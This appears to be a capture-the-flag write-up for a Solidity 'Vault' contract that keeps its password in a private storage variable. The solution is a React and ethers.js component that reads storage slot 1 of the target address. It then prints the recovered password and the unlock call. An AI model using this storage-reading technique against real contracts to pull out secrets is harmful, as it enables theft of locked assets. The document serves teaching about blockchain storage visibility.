# Vault Contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

# Solution
Event though you used private variables, everything on the blockchain is visible so you need to be careful. I used ethers.js to solve this as I am not yet able to find a solution 
to viewing storage with solidity. Below is my component using react.js and ethers.js to log out the storage. You will recieve a value such as
> 0x412076657279207374726f6e67207365637265742070617373776f7264203a29

This value is the bytes32 password that you will need.
> await contract.unlock('0x412076657279207374726f6e67207365637265742070617373776f7264203a29')

```
export default function ContractUI() {
    const targetAddress = '0x93177a1355694ca47163c3C9a44007e0B518Cd8b';
    const { ethers} = require('ethers');

    const attackContract = async () => {
        try {
            const { ethereum } = window;
            if(ethereum) {
                const provider = new ethers.providers.Web3Provider(ethereum)
                await provider.send("eth_requestAccounts", []);
                const storage = await provider.getStorageAt(targetAddress, 1)
                console.log('Storage: ', storage)
            }
        } catch(err) {
            console.log("Request Failed: ", err.message);
        }
    }

  return (
    <div>
        <h1>CONTRACT UI</h1>
        <button onClick={() => attackContract()}>Attack</button>
    </div>
  )
}

```

# What I learned
1. Sometimes you need to use a different framework to solve an issue.
2. private variables are not really "private" on the blockchain.
